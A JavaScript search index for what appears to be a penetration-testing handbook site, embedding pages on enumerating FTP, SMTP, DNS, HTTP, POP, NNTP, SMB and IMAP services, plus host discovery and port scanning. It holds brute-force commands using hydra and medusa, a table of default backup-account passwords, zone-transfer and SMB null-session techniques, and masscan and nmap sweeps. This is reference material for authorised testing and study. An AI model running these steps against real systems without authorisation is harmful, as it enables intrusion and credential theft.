'use strict';(function(){const indexCfg={cache:true};indexCfg.doc={id:'id',field:['title','content'],store:['title','href','section'],};const index=FlexSearch.create('balance',indexCfg);window.bookSearchIndex=index;index.add({'id':0,'href':'/book/preface/','title':"Preface",'section':"",'content':"Preface Conventions Default Addresses  Remote Host IP: 10.0.0.3 Remote CIDR Address: 10.0.0.0/24 Remote Domain Name: example.com Local Host IP: 10.0.0.1 Local Port Number: 1234 Local Domain Name: example.evil  Typography italic\nIndicates URLs, email addresses, filenames, and file extensions.\nmonospaced\nFor programming listings, as well as within paragraphs to refer to program elements such as variables or functions names, databases, data types, environment variables, statements, and keywords.\nbold monospaced\nCommands or other text that should be typed literally by the user.\nitalic monospaced\nText that should be replaced with user-supplied values or by values determined by context.\nHints This element signifies a tip or suggestion.  This element signifies a general note.  This element indicates a warning or caution.  "});index.add({'id':1,'href':'/book/services/ftp/','title':"FTP - 21",'section':"Services",'content':"FTP File Transfer Protocol.\nDefault Port: 21\n FTP is a standard network protocol used for the transfer of files between a client and a server on a computer network. FTP is built on a client-server architecture using separate control and data connections between the client and the server. FTP authenticates users with a clear-text sign-in protocol, normally in the form of a username and password, but can connect anonymously if the server is configured to allow it. 1\nBanner Grabbing Telnet telnet 10.0.0.3 21 Netcat nc -n 10.0.0.3 21 banner NSE Script nmap -sV -script banner -p21 -Pn 10.0.0.3 FTP ftp 10.0.0.3 FTP Exploits Search Refer to Exploits Search\nAnonymous Login During the port scanning phase Nmap\u0026rsquo;s script scan (-sC), can be enabled to check for FTP Bounce and Anonymous Login.  Try anonymous login using anonymous:anonymous credentials.\nftp 10.0.0.3 … Name (10.0.0.3:kali): anonymous 331 Please specify the password. Password: [anonymous] 230 Login successful. List all files in order.\nftp\u0026gt; ls -lat 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. … 226 Directory send OK. FTP Browser Client Due to its insecure nature, FTP support is being dropped by Firefox and Google Chrome.  Try accessing ftp://user:pass@10.0.0.3 from your browser. If not credentials provided anonymous:anonymous is assumed.\nBrute Forcing As an alternative to profiled passwords, Daniel Miessler\u0026rsquo;s SecLists includes a handy list of FTP default credentials.\nHydra 2 Using a colon-separated user:pass list.\nhydra -v -C /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt -f 10.0.0.3 ftp Using login user and passwords list.\nhydra -v -l ftp -P /usr/share/wordlists/rockyou.txt.gz -f 10.0.0.3 ftp   Parameters   -v: verbose mode. -C \u0026lt;user:pass file\u0026gt;: colon-separated \u0026ldquo;login:pass\u0026rdquo; format. -l \u0026lt;user\u0026gt;: login with user name. -P \u0026lt;passwords file\u0026gt;: login with password from file. -f: exit after the first found user/password pair.   Medusa 3 Medusa\u0026rsquo;s combo files (colon-separated) should be in the format host:username:password. If any of the three values are missing, the respective information should be provided either as a global value or as a list in a file.\nsed s/^/:/ /usr/share/seclists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt \u0026gt; /tmp/cplist.txt medusa -C /tmp/cplist.txt -h 10.0.0.3 -M ft Using login user and passwords list.\nmedusa -u ftp -P /usr/share/wordlists/rockyou.txt -h 10.0.0.3 -M ftp   Parameters   -u \u0026lt;user\u0026gt;: login with user name. -P \u0026lt;passwords file\u0026gt;: login with password from file. -h: target hostname or IP address. -M: module to execute.   Configuration files Examine configuration files.4\nftpusers ftp.conf proftpd.conf Miscellaneous Binary and ASCII Binary and ASCII files have to be uploading using the binary or ascii mode respectively, otherwise, the file will become corrupted. Use the corresponding command to switch between modes.5\nRecursively Download Recursively download FTP folder content.6\nwget -m ftp://user:pass@10.0.0.3/   Contributors to Wikimedia projects. “File Transfer Protocol - Wikipedia.” Wikipedia, the Free Encyclopedia, Wikimedia Foundation, Inc., 24 May 2002, https://en.wikipedia.org/wiki/File_Transfer_Protocol. \u0026#x21a9;\u0026#xfe0e;\n Heuse, Marc. “GitHub - Vanhauser-Thc/Thc-Hydra: Hydra.” GitHub, https://github.com/vanhauser-thc/thc-hydra. Accessed 12 May 2020. \u0026#x21a9;\u0026#xfe0e;\n “Foofus Networking Services - Medusa.” Foofus.Net | Foofus.Net Advanced Security Services Forum, http://foofus.net/goons/jmk/medusa/medusa.html. \u0026#x21a9;\u0026#xfe0e;\n “Penetration Testing Methodology” 0DAYsecurity.Com, http://www.0daysecurity.com/penetration-testing/enumeration.html. \u0026#x21a9;\u0026#xfe0e;\n “RFC959: FTP: Data Transfer Functions.” World Wide Web Consortium (W3C), https://www.w3.org/Protocols/rfc959/3_DataTransfer.html. \u0026#x21a9;\u0026#xfe0e;\n Thibaut Barrère. “Command Line - How to Recursively Download a Folder via FTP on Linux - Stack Overflow.” Stack Overflow, https://stackoverflow.com/a/113900/578050. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':2,'href':'/book/services/smtp/','title':"SMTP - 25 / 465 / 587",'section':"Services",'content':"SMTP Simple Mails Transfer Protocol.\nDefault Ports\n SMTP Relay (server-server communication): 25 SMTP Message Submission (client-server communcation): 578 SMTPS (Deprecated): 465   SMTP is a communication protocol for email transmission. It is commonly used to relay and submit messages to another email servers.\nSMTP is a delivery protocol only. Meaning mail is \u0026ldquo;pushed\u0026rdquo; to a destination mail server, or next-hop server, as it arrives. Mail is routed based on the destination server, not individual users to which it is addressed. Other protocols, such as the Post Office Protocol (POP) and the Internet Message Access Protocol (IMAP) are specifically designed for use by individual users retrieving messages and managing mailboxes. 1\nCommunication between sender and receiver is made by issuing command strings. See SMTP commands reference.\nBanner Grabbing SMTP Telnet telnet 10.0.0.3 25 Netcat nc -n 10.0.0.3 25 SMPTS openssl 2 openssl s_client -starttls smtp -crlf -connect 10.0.0.3:587   Parameters   s_client: SSL/TLS client program. -starttls \u0026lt;protocol\u0026gt;: send the protocol-specific message(s) to switch to TLS for communication. -crlf: translate a line feed from the terminal into CR+LF.   Enumeration smtp-commands NSE Script nmap -p 25,465,587 --script smtp-commands 10.0.0.3 smtp-enum-users NSE Script nmap -p 25,465,587 --script smtp-enum-users 10.0.0.3 NTLM Information Disclosure On Windows, with NTLM authentication enabled, sending a SMTP NTLM authentication request with null credentials will cause the remote service to respond with a NTLMSSP message disclosing information to include NetBIOS, DNS, and OS build version. 3 4\nManually telnet example.com 587 ... \u0026gt;\u0026gt; HELO 250 example.com Hello [x.x.x.x] \u0026gt;\u0026gt;AUTH NTLM 334 NTLM supported \u0026gt;\u0026gt;TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= 334 TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA smtp-ntlm-info NSE Script nmap -p 587 --script smtp-ntlm-info --script-args smtp-ntlm-info.domain=example.com 10.0.0.3 Commands HELO Identify to the SMTP server. EHLO Alternative HELO for Extended SMTP protocol. MAIL FROM: Sender\u0026#39;s email address. RCPT TO: Recipient\u0026#39;s email address. DATA Initiate message content transfer. Command is terminated with a line containing only a . RSET Reset the session. Connection will not be closed. VRFY Verify username or mailbox. NOOP No-op. Keeps connection open. QUIT Ends session. Sessions must start with HELO and end with QUIT.  SMTP Exploits Search Refer to Exploits Search\nConfiguration files sendmail.cf submit.cf   “RFC 5321 - Simple Mail Transfer Protocol.” IETF Tools, https://tools.ietf.org/html/rfc5321.. \u0026#x21a9;\u0026#xfe0e;\n OpenSSL Foundation, Inc. “/Docs/Manmaster/Man1/Openssl.Html.” OpenSSL.Org, https://www.openssl.org/docs/manmaster/man1/openssl.html. \u0026#x21a9;\u0026#xfe0e;\n “Smtp-Ntlm-Info NSE Script.” Nmap: The Network Mapper - Free Security Scanner, https://nmap.org/nsedoc/scripts/smtp-ntlm-info.html. \u0026#x21a9;\u0026#xfe0e;\n m8r0wn. “Internal Information Disclosure Using Hidden NTLM Authentication | by M8r0wn | Medium.” Medium, Medium, 9 Mar. 2020, https://medium.com/@m8r0wn/internal-information-disclosure-using-hidden-ntlm-authentication-18de17675666. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':3,'href':'/book/services/dns/','title':"DNS - 53",'section':"Services",'content':"DNS Domain Name Systems.\nDefault Port: 53\n The Domain Name System (DNS) is a hierarchical and decentralized naming system for computers, services, and other resources connected to a network. It associates different information with domain names assigned to each of the participating entities. Most prominently, it translates more easily memorized domain names to the numerical IP addresses needed for identifying computer services and devices with the underlying network protocols. 1\nTCP and UDP By default, DNS uses UDP on port 53 to serve requests. When the size of the request, or the response, exceeds the single packet size of 512 bytes, the query is re-sent using TCP. Multiple records responses, IPv6 responses, big TXT records, DNSSEC responses, and zone transfers are some examples of these requests.\nWhen DNS is running on TCP, it is worth checking if zone trasfer is enabled.  Banner Grabbing DNS does not provide an information banner per se but BIND DNS exposes its version by default. 2\nThe version.bind directive is stored under the options section in the /etc/named.conf configuration file.  dig dig version.bind CHAOS TXT @10.0.0.3 dns-nsid NSE Script nmap -sV --script dns-nsid -p53 -Pn 10.0.0.3 FTP Exploits Search Refer to Exploits Search\nZone Transfer DNS reconnaissance is especially valuable during the information gathering stage since it could reveal crucial information about the domain and the infrastructure. But it can also reveal new attack vectors, for example, if Virtual Routing is enabled.\nA zone transfer is the process where a DNS server, usually a Master server, passes a copy of a zone to another DNS server, usually a Slave server. Ideally, these transfers are limited to certain IPs, but misconfigured servers allow these transfers to anyone asking for them.\ndig dig axfr @10.0.0.3 domain   Parameters   axfr: initiate an AXFR zone transfer query. @10.0.0.3: name or IP of the server to query. domain: name of the resource record that is to be looked up.   It is worth trying to initiate a zone transfer without a domain.  Configuration files Examine configuration files.3\nhost.conf resolv.conf named.conf Further Reading  SANS Securing DNS Zone Transfer What the internet looke like in 1982    Contributors to Wikimedia projects. “Domain Name System - Wikipedia.” Wikipedia, the Free Encyclopedia, Wikimedia Foundation, Inc., 20 Aug. 2001, https://en.wikipedia.org/wiki/Domain_Name_System. \u0026#x21a9;\u0026#xfe0e;\n “Determining BIND DNS Version Using Dig.” OSI Security - Penetration Testing \u0026amp; Web Application Security Consultants, https://www.osi.security/blog/determining-bind-dns-version-using-dig. \u0026#x21a9;\u0026#xfe0e;\n “Penetration Testing Methodology” 0DAYsecurity.Com, http://www.0daysecurity.com/penetration-testing/enumeration.html. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':4,'href':'/book/services/http-https/','title':"HTTP/S - 80 / 443",'section':"Services",'content':"HTTP/S Hypertext Transfer Protocol and Hypertext Transfer Protocol Secure.\nDefault Ports\n HTTP: 80 HTTPS (HTTP over TLS or SSL): 443   Directory Enumeration As a first step, while we browse the web/application, it is a good idea to do some files and directories enumeration, look for unlinked content, temporary directories, and backups. Widely used tools include dirbuster, gobuster, dirb and the suite Burp.\nWordlists Included in Kali\u0026rsquo;s wordlists package.\n  James Fisher\u0026rsquo;s 2.3 medium ( 1.9M - 220560 lines )\n/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt\n  James Fisher\u0026rsquo;s 2.3 small ( 709K - 87664 lines )\n/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt\n  dirb common ( 36K - 4614 lines )\n/usr/share/wordlists/dirb/common.txt\n  dirb big ( 180K - 20469 lines )\n/usr/share/wordlists/dirb/big.txt\n  Not included in Kali.\n  Jhaddix\u0026rsquo;s content_discovery_all ( 5.9M - 373535 lines )\nhttps://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10\n  Daniel Miessler\u0026rsquo;s Robots Disallowed and SecLists (Includes the former one).\nhttps://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content\n  gobuster 1 gobuster dir -t 30 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.0.0.3/   Parameters   dir: directory brute-forcing mode. -t \u0026lt;n\u0026gt;: number of concurrent threads (default 10). -w \u0026lt;wordlist\u0026gt;: path to the wordlist. -u \u0026lt;URL\u0026gt;: target URL.    Iterate over the results. Include status code 403 (Forbidden Error) and brutefoce these directories. Add more file extensions to search for; In gobuster: -x sh,pl.   Source Code Inspect It is a good habit to take a quick look at the pages\u0026rsquo; source code, scripts, and console outputs.\nTo active View Source, context-click on the page and select View Page Source or with the Ctrl+U or Cmd+U shortcut.\nMany browsers include a powerful suite of tools, also known as devtools, to inspect and interact with the target website.  Download If the target uses an open-source app, downloading its codebase will provide helpful information about configuration files, open resources, default credentials, etc.\n  Reeves, OJ. “GitHub - OJ/Gobuster.” GitHub, https://github.com/OJ/gobuster. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':6,'href':'/book/discovery-and-scanning/host-discovery/','title':"Host Discovery",'section':"Discovery and Scanning",'content':"Host Discovery One of the first steps during the network enumeration is to reduce a set of IPs into a list of active or interesting hosts. Depending on if you are inside the network or scanning remotely, how much noise you can make, and your discovery requirements, different tools, and options are available.\nInternal Passive Passive discovery relies on monitoring network layer traffic to detect network topology, services, and applications. The process does not generate any network traffic.\nAlthough is a slow process compared to an active scan and unreliable for service enumeration, as no packets are injected in the network, there is no risk of unintentional service disruption. Giving the advantage of being able to find intermittently offered or protected services that are often missed by active scanning. 1\nnetdiscover - ARP 2 sudo netdiscover -p  -p: passive mode. It does not send anything, but does only sniff.  p0f - Fingerprinting 3 sudo p0f -p  -p: promiscuous mode; by default, it listens only to packet addressed or routed through.\nOn IP-enabled interfaces can be detected remotely.  Active In contrast, active discovery does inject a variety of packets into the network, making it well suited for open port discovery and fingerprinting. However, these techniques are not without drawbacks. Scans can be invasive, generate too much noise and, in some cases cause service interruptions due to the type of packets that may be sent.\nnetdiscover - ARP 2 sudo netdiscover -r 10.0.0.0/24  -r \u0026lt;range\u0026gt;: scan a given range instead of auto scan.  Nmap nmap -sn 10.0.0.0/24  -sn: No port scan AKA ping scan. 4 Consists of an ICMP echo request, TCP SYN to port 443, TCP ACK to port 80, and an ICMP timestamp request by default.  nbtscan - NetBIOS 5 sudo nbtscan 10.0.0.0/24 ICMP Refer to External ICMP Scanning\nExternal ICMP As defined in RFC 792, ICMP messages are typically used for diagnostic or control purposes or generated in response to errors in IP operations (as specified in RFC 1122).6\nAlthough it is possible to use ICMP requests to discover if a host is up or not, it is common to find all these packets being filtered, making it an unreliable method.\nping ping -c 1 10.0.0.3  -c \u0026lt;count\u0026gt;: stops after count replies.  fping 7 fping -g 10.0.0.0/24  -g, --generate \u0026lt;target\u0026gt;: generates target list. target can be start and end IP or a CIDR address.  Nmap nmap -PEPM -sn -n 10.0.0.0/24   Parameters   -PE; -PP; -PM: ICMP echo, timestamp, and netmask request discovery probes. -sn: No port scan. -n: No DNS resolution.   Port Discovery Another commonly used technique is port scanning. It allows you to identify running services, consequently, interesting hosts. See Port Scanning.\n  Whyte, David. Network Scanning Detection Strategies for Enterprise Networks. Sept. 2008, pp. 12-22 https://pdfs.semanticscholar.org/bb60/dc6cf24ea1f17126511e0998d3c55bdd50f9.pdf. \u0026#x21a9;\u0026#xfe0e;\n “GitHub - Netdiscover-Scanner/Netdiscover: Netdiscover, ARP Scanner (Official Repository).” GitHub, https://github.com/netdiscover-scanner/netdiscover. \u0026#x21a9;\u0026#xfe0e;\n Zalewski, Michal. “P0f V3.” [Lcamtuf.Coredump.Cx], https://lcamtuf.coredump.cx/p0f3/. \u0026#x21a9;\u0026#xfe0e;\n “Host Discovery | Nmap Network Scanning.” Nmap: The Network Mapper - Free Security Scanner, https://nmap.org/book/man-host-discovery.html. \u0026#x21a9;\u0026#xfe0e;\n “NETBIOS Nameserver Scanner.” Steve Friedl’s Home Page, http://www.unixwiz.net/tools/nbtscan.html. \u0026#x21a9;\u0026#xfe0e;\n Forouzan, Behrouz A. Data Communications and Networking. Huga Media, 2007, pp. 621–630. \u0026#x21a9;\u0026#xfe0e;\n Schweikert, David. “Fping.” Fping Homepage, https://fping.org/. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':7,'href':'/book/discovery-and-scanning/port-scanning/','title':"Port Scanning",'section':"Discovery and Scanning",'content':"Port Scanning Let\u0026rsquo;s continue narrowing down our attack vector. It is time now to grab your host or list of hosts and scan for open ports and running services.\nPort scanners can be categorized between synchronous or connection-oriented and asynchronous or connectionless.\nSynchronous scanners, like Nmap, wait for a host response (until the timeout period expires) to determine if the port it\u0026rsquo;s alive. This translates to slower scans, especially on big network ranges, but an accurate port discovery in comparison with connectionless scanners.\nAsynchronous scanners like scanrad, zmap, or masscan, on the other hand, don\u0026rsquo;t wait for a host response as they create separate threads for each port. This allows a high-speed scan, but less accurate since they cannot detect dropped packets.\nCombining both tools could help you find a balance between speed and accuracy for each engagement. 1\nNetwork Sweep masscan 2 sudo masscan -p 7,9,13,21-23,25-26,37,53,79-81,88,106,110-111,113,119,135,139,143-144,179,199,389,427,443-445,465,513-515,543-544,548,554,587,631,646,873,990,993,995,1025-1029,1110,1433,1720,1723,1755,1900,2000-2001,2049,2121,2717,3000,3128,3306,3389,3986,4899,5000,5009,5051,5060,5101,5190,5357,5432,5631,5666,5800,5900,6000-6001,6646,7070,8000,8008-8009,8080-8081,8443,8888,9100,9999-10000,32768,49152-49157 --rate 50000 --wait 0 --open-only -oG masscan.gnmap 10.0.0.0/24   Parameters   -p \u0026lt;ports\u0026gt;: port(s) to be scanned. --rate \u0026lt;rate\u0026gt;: rate for transmitting packets (packet per seconds). --wait \u0026lt;seconds\u0026gt;: seconds after transmit is done to wait for receiving packets before exiting. Default 10 seconds. --open-only: report only open ports. -oG \u0026lt;filename\u0026gt;: output scan in grepable format to the given filename.   Host Scan TCP Scan This is a good all-purpose initial scan. Scans the most common 1000 ports with service information (-sV), default scripts (-sC), and OS detection.\nVerbose mode (-v) not only provides the estimated time for each host, but, it also prints the results as it goes letting you continue with the reconnaissance while scanning.  sudo nmap -v -sV -sC -O -T4 -n -Pn -oA nmap_scan 10.0.0.3 Similar scan but scans all ports, from 1 through 65535.\nsudo nmap -v -sV -sC -O -T4 -n -Pn -p- -oA nmap_fullscan 10.0.0.3 UDP Scan During a UDP scan (-Su) -sV will send protocol-specific probes, also known as nmap-service-probes, to every open|filtered port. In case of response the state change to open. 3\nsudo nmap -sU -sV --version-intensity 0 -n 10.0.0.0/24 Enumeration Scan In addition to the default scripts that run with -sC or --script=default, NSE (Nmap Scripting Engine), provides multiple types and categories to select from.\nIt is a common practice to combine the list of ports resulting from a network sweep or a fast nmap scan like:\nnmap -T4 -Pn -n 10.0.0.3 with a more extensive scan against those ports.\nsudo nmap -v -sV -O --script=\u0026#34;safe and vuln\u0026#34; -T4 -n -Pn -p135,445 -oA nmap_scan 10.0.0.3 The --script parameter is extremely flexible and full features, refer to the documentation for more about NSE.\nNever run scripts from third parties unless you trust the authors or have carefully audited the scripts yourself.   Parameters   -v: verbose mode. -sU: UDP scan. -sV: determine service/version info. -sC: performs a script scan. -O: enable OS detection. -p \u0026lt;port ranges\u0026gt;: scan specific ports. --open: only show open ports. -Pn: no ping. -n: no DNS resolution. -T\u0026lt;0-5\u0026gt;: timing template. oX \u0026lt;filename\u0026gt;: output scan in XML format to the given filename. --version-intensity 0: try only the probes most likely to be effective.   Miscellaneous List all Nmap scripts categories grep -r categories /usr/share/nmap/scripts/*.nse | grep -oP \u0026#39;\u0026#34;.*?\u0026#34;\u0026#39; | sort -u List Nmap scripts for a specific category List scripts under the default category.\ngrep -r categories /usr/share/nmap/scripts/*.nse | grep default | cut -d: -f1   Capt. Meelo. “Finding the Balance Between Speed \u0026amp; Accuracy During an Internet-Wide Port Scanning - Hack.Learn.Share.” Hack.Learn.Share, 29 July 2019, https://captmeelo.com/pentest/2019/07/29/port-scanning.html. \u0026#x21a9;\u0026#xfe0e;\n Graham, Robert David. “GitHub - Robertdavidgraham/Masscan: TCP Port Scanner.” GitHub, https://github.com/robertdavidgraham/masscan. \u0026#x21a9;\u0026#xfe0e;\n “UDP Scan (-SU) | Nmap Network Scanning.” Nmap: The Network Mapper - Free Security Scanner, https://nmap.org/book/scan-methods-udp-scan.html. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':8,'href':'/book/services/pop/','title':"POP - 110 / 995",'section':"Services",'content':"POP Post Office Protocol.\nDefault Ports\n POP3: 110 POP3S (POP3 over TLS or SSL): 995   POP, or POP3 (POP version 3), is an application-layer protocol used by email clients to retrieve messages from a mail server. It provides access via IP to mailboxes maintained on a server.\nBecause POP was designed for temporary Internet connection, clients connect, retrieve messages, store them on the client, and finally delete them from the server. Clients also have the option to leave messages on the server. By contrast, IMAP was designed to normally leave all messages on the server allowing multiple client applications as online and offline modes. 1\nBanner Grabbing Telnet telnet 10.0.0.3 110 Netcat nc -n 10.0.0.3 110 openssl 2 openssl s_client -crlf -connect 10.0.0.3:995   Parameters   s_client: SSL/TLS client program. -crlf: translate a line feed from the terminal into CR+LF.   NTLM Information Disclosure See SMTP NTLM Information Disclosure\npop3-ntlm-info NSE Script nmap -p 110,995 --script pop3-ntlm-info 10.0.0.3 Capabilities POP3 capabilities are defined in RFC2449. The CAPA command allows a client to ask a server what commands it supports and possibly any site-specific policy.\npop3-capabilities NSE Script nmap -p 110,995 --script pop3-capabilities 10.0.0.3 Commands USER Username or mailbox. PASS Server/mailbox-specific password. STAT Number of messages in the mailbox. LIST [ message# ] Messages summary. RETR [ message# ] Retrieve selected message. DELE [ message# ] Delete selected message. RSET Reset the session. Undelete deleted messages. NOOP No-op. Keeps connection open. QUIT End session. Server responses will start either with a successful (+OK) or failed status -ERR.  POP3 Exploits Search Refer to Exploits Search\n  Contributors to Wikimedia projects. “Post Office Protocol - Wikipedia.” Wikipedia, the Free Encyclopedia, Wikimedia Foundation, Inc., 9 Sept. 2001, https://en.wikipedia.org/wiki/Post_Office_Protocol. \u0026#x21a9;\u0026#xfe0e;\n OpenSSL Foundation, Inc. “/Docs/Manmaster/Man1/Openssl.Html.” OpenSSL.Org, https://www.openssl.org/docs/manmaster/man1/openssl.html. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':9,'href':'/book/services/nntp/','title':"NNTP - 119 / 433 / 563",'section':"Services",'content':"NNTP Network News Transfer Protocol.\nDefault Ports\n NNTP: 119 NNTPS (NNTPS over TLS): 563 NNSP (server-server bulk transfer): 433   NNTP is an application-layer protocol used for transporting Usenet news articles between news servers. Client applications can also inquire, retrieve, and post articles.\nBanner Grabbing Telnet telnet 10.0.0.3 119 Netcat nc -n 10.0.0.3 119 openssl 1 openssl s_client -crlf -connect 10.0.0.3:563   Parameters   s_client: SSL/TLS client program. -crlf: translate a line feed from the terminal into CR+LF.   Commands Various commands allow clients to retrieve, send, and post articles. The difference between send and post is that the latter involves articles with incomplete header information.\nNNTP also provides active and passive news transfer, or \u0026ldquo;pushing\u0026rdquo; and \u0026ldquo;pulling\u0026rdquo; respectively. When pushing, the client offers an article through IHAVE \u0026lt;message_id\u0026gt;. When pulling, the client requests a list of available articles for the specified date through NEWNEWS \u0026lt;YYMMDD\u0026gt; \u0026lt;HHMMSS\u0026gt;.\nSeveral commands also allow clients to retrieve the article header and body separately, or even single header lines from a range of articles. 2\nNNTP commands responses always end with a period (.) on a line by itself.  CAPABILITIES List server capabilities. HELP Show available commands. MODE READER Use Reader mode. Reader mode uses a lot of commands, use HELP. LIST List groups. SELECT \u0026lt;group\u0026gt; Select group. LISTGROUP \u0026lt;group\u0026gt; List article in a group. HEAD \u0026lt;article_id\u0026gt; Retrieve article header. BODY \u0026lt;article_id\u0026gt; Retrieve article body. ARTICLE \u0026lt;article_id\u0026gt; Retrieve article. POST Post article. NNTP Exploits Search Refer to Exploits Search\n  OpenSSL Foundation, Inc. “/Docs/Manmaster/Man1/Openssl.Html.” OpenSSL.Org, https://www.openssl.org/docs/manmaster/man1/openssl.html. \u0026#x21a9;\u0026#xfe0e;\n “22. NNTP and the Nntpd Daemon - Linux Network Administrator’s Guide, Second Edition [Book].” O’Reilly Online Learning, O’Reilly Media, Inc., https://www.oreilly.com/library/view/linux-network-administrators/1565924002/ch22.html. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':10,'href':'/book/services/smb/','title':"SMB - 139 / 445",'section':"Services",'content':"SMB Server Message Block.\nDefault Ports\n SMB over NetBIOS (NetBIOS over TCP/IP): 139 SMB over TCP/IP: 445   SMB is a network communication protocol for providing shared access to files, printers, and serial ports between nodes on a network. It also provides an authenticated IPC (inter-process communication) mechanism.1\nWindows SMB Ports and Protocols Originally, in Windows NT, SMB ran on top of NBT (NetBIOS over TCP/IP), which uses ports UDP 137 and 138, and TCP 139. With Windows 2000, was introduced the option to run \u0026ldquo;NetBIOS-less\u0026rdquo; SMB directly over TCP/IP, without the extra NBT layer on port 445. Older versions of Windows (with NBT enabled) will try to connect to both port 139 and 445 simultaneously, while in newer versions, port 139 is a fall-back port, as clients will try to connect to port 445 by default.2\nSMB Host Discovery Refer to host discovert with nbtscan.\nServer Version Metasploit SMB Auxiliary Module 3 msf\u0026gt; use auxiliary/scanner/smb/smb_version msf\u0026gt; set rhost 10.0.0.3 msf\u0026gt; run SMB Exploits Search Refer to Exploits Search\nCommon Login Credentials Backup and Management software requires dedicated user accounts on the server or local machine to function, and are often set with a weak password. 4\n   Usernmae Password     (blank) (blank)   Administrator admin guest (blank) admin password   arcserve arcserve backup   tivoli tivoli   backupexec backupexec backup   test test    List Look for available shares using default credentials.\nsmbclient 5 smbclient -N -L //10.0.0.3   Parameters   -N: remove the password prompt from the client to the user. -L: list services available on the server.   Connect smbclient 5 smbclient -N //10.0.0.3/Share Mount 6 mount -t cifs -o username=user,password=password //10.0.0.3/Share /mnt/share Null Session Enumeration Windows Administrative Shares Administrative shares are hidden shares that provide administrators the ability to remotely manage hosts. They are automatically created and enabled by default.\nIt is worth clarifying these shares are not hidden but removed from views just by appending a dollar sign ($) to the share name. Ultimately, the share will be part of the result if listing from a Unix-based system or by using: net share and net view /all.  Three common shares are:\n C$: allows access to the C Drive on the remote machine. Admin$: allows access to the Windows installation directory. IPC$: allows inter-process communication or IPC.  IPC$ Share IPC$ is a special share used to facilitate inter-process communication (IPC). In other words, it does not allow access to files or directories, but it allows to communicate with processes running on the remote system. Specifically, IPC$ exposes named pipes, which can be written or read to communicate with remote processes. These named pipes are created when an application opens a pipe and registers it with SMB so that it can be exposed by the IPC$ share. On the one hand, data written to the named pipe is sent to the remote process, and on the other hand, a local application reads the output information written by the remote process. They are usually used to perform specific functions on the remote system, also known as RPC or remote procedure calls.\nSome versions of Windows allow you to authenticate and mount the IPC$ share without providing a username and password. Such a connection is often called a NULL session, which, despite its limited privileges, could be used to make multiple RPC calls and obtain useful information about the remote system.7\n  Contributors to Wikimedia projects. “Server Message Block - Wikipedia.” Wikipedia, the Free Encyclopedia, Wikimedia Foundation, Inc., 26 Oct. 2003, https://en.wikipedia.org/wiki/Server_Message_Block. \u0026#x21a9;\u0026#xfe0e;\n “The Use of TCP Ports 139 and 445 in Windows.” Vidstrom Labs, https://vidstromlabs.com/blog/the-use-of-tcp-ports-139-and-445-in-windows/. \u0026#x21a9;\u0026#xfe0e;\n “Scanner SMB Auxiliary Modules - Metasploit Unleashed.” Infosec Training and Penetration Testing | Offensive Security, https://www.offensive-security.com/metasploit-unleashed/scanner-smb-auxiliary-modules/. \u0026#x21a9;\u0026#xfe0e;\n McNab, Chris. Network Security Assessment. “O’Reilly Media, Inc.,” 2007, p. 281. \u0026#x21a9;\u0026#xfe0e;\n “Smbclient.” Samba - Opening Windows to a Wider World, https://www.samba.org/samba/docs/current/man-html/smbclient.1.html. \u0026#x21a9;\u0026#xfe0e;\n “Mounting Samba Shares from a Unix Client.” SambaWiki, https://wiki.samba.org/index.php/Mounting_samba_shares_from_a_unix_client. \u0026#x21a9;\u0026#xfe0e;\n “A New Look at Null Sessions and User Enumeration.” SensePost, https://sensepost.com/blog/2018/a-new-look-at-null-sessions-and-user-enumeration/. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':11,'href':'/book/services/imap/','title':"IMAP - 143 / 993",'section':"Services",'content':"IMAP Internet Message Access Protocol.\nDefault Ports\n IMAP: 143 IMAPS (IMAP over SSL): 993   IMAP is an application-layer protocol used by email clients to retrieve messages from a mail server. It was designed to manage multiple email clients, therefore clients generally leave messages on the server until the user explicitly deletes them. 1\nBanner Grabbing Telnet telnet 10.0.0.3 143 Netcat nc -n 10.0.0.3 143 openssl [^openssl] openssl s_client -connect 10.0.0.3:993   Parameters   s_client: SSL/TLS client program.   NTLM Information Disclosure See SMTP NTLM Information Disclosure\nManually telnet example.com 143 ... \u0026gt;\u0026gt; a1 AUTHENTICATE NTLM + \u0026gt;\u0026gt; TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA= + TlRMTVNTUAACAAAACgAKADgAAAAFgooCBqqVKFrKPCMAAAAAAAAAAEgASABCAAAABgOAJQAAAA9JAEkAUwAwADEAAgAKAEkASQBTADAAMQABAAoASQBJAFMAMAAxAAQACgBJAEkAUwAwADEAAwAKAEkASQBTADAAMQAHAAgAHwMI0VPy1QEAAAAA imap-ntlm-info NSE Script nmap -p 143,993 --script imap-ntlm-info 10.0.0.3 IMAP Exploits Search Refer to Exploits Search\n  Contributors to Wikimedia projects. “Internet Message Access Protocol - Wikipedia.” Wikipedia, the Free Encyclopedia, Wikimedia Foundation, Inc., 7 Sept. 2001, https://en.wikipedia.org/wiki/Internet_Message_Access_Protocol. \u0026#x21a9;\u0026#xfe0e;\n   "});index.add({'id':12,'href':'/book/exploits-search/','title':"Exploits Search",'section':"",'content':"Exploits Search Offline searchsploit 1 Periodically update the database with searchsploit -u.  Search vulnerabilities based on a Nmap\u0026rsquo;s XML result.\nsearchsploit --nmap nmap.xml Basic search and 